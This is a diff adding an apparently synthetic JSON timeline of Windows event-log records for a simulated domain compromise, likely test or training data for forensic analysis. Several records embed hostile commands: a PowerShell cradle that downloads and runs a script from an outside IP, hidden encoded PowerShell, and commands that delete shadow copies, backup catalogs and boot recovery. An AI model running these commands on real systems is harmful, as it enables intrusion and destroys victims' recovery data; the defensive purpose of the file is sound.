@@ -1,0 +1,146 @@
+[
+  {
+    "datetime": "2024-03-15T09:15:00Z",
+    "timestamp_desc": "Scheduled Task Created for persistence",
+    "hostname": "WS01.corp.local",
+    "username": "svc_backup",
+    "EventID": "4698",
+    "message": "A scheduled task was created. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200 Task Information: Task Name: \\Microsoft\\Windows\\WindowsUpdate\\UpdateTask Task Content: <?xml version=\"1.0\" encoding=\"UTF-16\"?><Task version=\"1.2\"><Triggers><CalendarTrigger><StartBoundary>2024-03-16T00:00:00</StartBoundary><ScheduleByDay><DaysInterval>1</DaysInterval></ScheduleByDay></CalendarTrigger></Triggers><Actions><Exec><Command>powershell.exe</Command><Arguments>-nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAA7</Arguments></Exec></Actions></Task>"
+  },
+  {
+    "datetime": "2024-03-15T09:15:05Z",
+    "timestamp_desc": "Scheduled Task Created on file server",
+    "hostname": "SRV-FILE01.corp.local",
+    "username": "mrodriguez",
+    "EventID": "4698",
+    "message": "A scheduled task was created. Subject: Security ID: CORP\\mrodriguez Account Name: mrodriguez Account Domain: CORP Logon ID: 0x5D4001 Task Information: Task Name: \\Microsoft\\Windows\\MUI\\LpkSetup Task Content: <?xml version=\"1.0\"?><Task><Actions><Exec><Command>cmd.exe</Command><Arguments>/c powershell -nop -exec bypass -c \"IEX((New-Object Net.WebClient).DownloadString('http://185.220.101.47/payload.ps1'))\"</Arguments></Exec></Actions></Task>"
+  },
+  {
+    "datetime": "2024-03-15T09:15:30Z",
+    "timestamp_desc": "Registry Autorun modification",
+    "hostname": "WS01.corp.local",
+    "username": "svc_backup",
+    "EventID": "12",
+    "message": "Registry key and value added: EventType: SetValue Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\WindowsUpdate Details: C:\\Users\\svc_backup\\AppData\\Roaming\\Microsoft\\Windows\\agent.exe"
+  },
+  {
+    "datetime": "2024-03-15T09:15:35Z",
+    "timestamp_desc": "Registry Autorun modification value set",
+    "hostname": "WS01.corp.local",
+    "username": "svc_backup",
+    "EventID": "13",
+    "message": "Registry value set: EventType: SetValue Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetObject: HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce\\WinUpdate Details: C:\\Users\\svc_backup\\AppData\\Local\\Temp\\svc.exe -persist"
+  },
+  {
+    "datetime": "2024-03-15T09:16:00Z",
+    "timestamp_desc": "Startup folder file drop",
+    "hostname": "SRV-FILE01.corp.local",
+    "username": "mrodriguez",
+    "EventID": "11",
+    "message": "File created: Image: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe TargetFilename: C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\WindowsUpdate.exe CreationUtcTime: 2024-03-15T09:16:00.000Z"
+  },
+  {
+    "datetime": "2024-03-15T09:16:30Z",
+    "timestamp_desc": "New service installed on DC for persistence",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "4697",
+    "message": "A service was installed in the system. Subject: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001 Service Information: Service Name: WinDefUpdate Service File Name: C:\\Users\\dadmin\\AppData\\Roaming\\Microsoft\\Windows\\wupdt.exe Service Type: User Mode Service Service Start Type: Auto Start Service Account: LocalSystem"
+  },
+  {
+    "datetime": "2024-03-15T09:16:45Z",
+    "timestamp_desc": "Service installed from user AppData path",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "4697",
+    "message": "A service was installed in the system. Service File Name: C:\\Users\\dadmin\\AppData\\Local\\Temp\\msupdate.exe Service Name: WinUpdateSvc Service Type: Win32 OwnProcess Service Start Type: Auto Start Service Account: LocalSystem"
+  },
+  {
+    "datetime": "2024-03-15T09:17:00Z",
+    "timestamp_desc": "Audit policy disabled - anti-forensics",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "4719",
+    "message": "System audit policy was changed. Subject: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001 Audit Policy Change: Category: Account Logon Subcategory: Kerberos Authentication Service Subcategory GUID: {0CCE9242-69AE-11D9-BED3-505054503030} Changes: Audit Policy on: No Auditing"
+  },
+  {
+    "datetime": "2024-03-15T09:17:10Z",
+    "timestamp_desc": "Security audit log cleared on DC",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "1102",
+    "message": "The audit log was cleared. Subject: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001"
+  },
+  {
+    "datetime": "2024-03-15T09:17:15Z",
+    "timestamp_desc": "Security audit log cleared on WS01",
+    "hostname": "WS01.corp.local",
+    "username": "svc_backup",
+    "EventID": "1102",
+    "message": "The audit log was cleared. Subject: Security ID: CORP\\svc_backup Account Name: svc_backup Account Domain: CORP Logon ID: 0x4B1200"
+  },
+  {
+    "datetime": "2024-03-15T09:17:30Z",
+    "timestamp_desc": "WMI event subscription for persistence",
+    "hostname": "SRV-FILE01.corp.local",
+    "username": "mrodriguez",
+    "EventID": "19",
+    "message": "WmiEventFilter activity detected: EventType: WmiEventFilter Name: WindowsUpdateFilter Query: SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Second = 0 EventNamespace: root\\cimv2"
+  },
+  {
+    "datetime": "2024-03-15T09:17:35Z",
+    "timestamp_desc": "WMI event consumer for persistence",
+    "hostname": "SRV-FILE01.corp.local",
+    "username": "mrodriguez",
+    "EventID": "20",
+    "message": "WmiEventConsumer activity detected: EventType: WmiEventConsumer Name: WindowsUpdateConsumer Type: CommandLineEventConsumer Destination: cmd.exe /c powershell -nop -w hidden -enc JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAA="
+  },
+  {
+    "datetime": "2024-03-15T09:17:40Z",
+    "timestamp_desc": "WMI filter to consumer binding",
+    "hostname": "SRV-FILE01.corp.local",
+    "username": "mrodriguez",
+    "EventID": "21",
+    "message": "WmiEventConsumerToFilter activity detected: EventType: WmiEventConsumerToFilter Consumer: CommandLineEventConsumer.Name='WindowsUpdateConsumer' Filter: __EventFilter.Name='WindowsUpdateFilter'"
+  },
+  {
+    "datetime": "2024-03-15T09:18:00Z",
+    "timestamp_desc": "GPO modification for domain persistence",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "5136",
+    "message": "A directory service object was modified. Subject: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001 Directory Service: Name: corp.local Type: Active Directory Domain Services Object: DN: CN={31B2F340-016D-11D2-945F-00C04FB984F9},CN=Policies,CN=System,DC=corp,DC=local GUID: Group Policy Object Class: groupPolicyContainer Attribute: ldapDisplayName: gPCFileSysPath Syntax: ADS_SYNTAX_DN Value: \\\\corp.local\\SysVol\\corp.local\\Policies\\{31B2F340-016D-11D2-945F-00C04FB984F9} Operation Type: Attribute Write"
+  },
+  {
+    "datetime": "2024-03-15T09:18:10Z",
+    "timestamp_desc": "AdminSDHolder modification for persistent DA access",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "5136",
+    "message": "A directory service object was modified. Subject: Security ID: CORP\\dadmin Account Name: dadmin Account Domain: CORP Logon ID: 0x6D3001 Directory Service: Name: corp.local Type: Active Directory Domain Services Object: DN: CN=AdminSDHolder,CN=System,DC=corp,DC=local GUID: Schema Class: container Attribute: ldapDisplayName: nTSecurityDescriptor Operation Type: Attribute Write Value: D:(A;;CCLCSWLOCRRC;;;AU)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;DA)(A;;CC;svc_backup;)"
+  },
+  {
+    "datetime": "2024-03-15T09:18:30Z",
+    "timestamp_desc": "Shadow copy deletion - anti-forensics prep",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "1",
+    "message": "Process Create: Image: C:\\Windows\\System32\\cmd.exe CommandLine: cmd.exe /c vssadmin delete shadows /all /quiet ParentImage: C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe User: CORP\\dadmin"
+  },
+  {
+    "datetime": "2024-03-15T09:18:35Z",
+    "timestamp_desc": "BCDEdit recovery disabled",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "1",
+    "message": "Process Create: Image: C:\\Windows\\System32\\bcdedit.exe CommandLine: bcdedit /set {default} recoveryenabled no ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\dadmin"
+  },
+  {
+    "datetime": "2024-03-15T09:18:40Z",
+    "timestamp_desc": "Wbadmin catalog delete",
+    "hostname": "DC01.corp.local",
+    "username": "dadmin",
+    "EventID": "1",
+    "message": "Process Create: Image: C:\\Windows\\System32\\wbadmin.exe CommandLine: wbadmin delete catalog -quiet ParentImage: C:\\Windows\\System32\\cmd.exe User: CORP\\dadmin"
+  }
+]
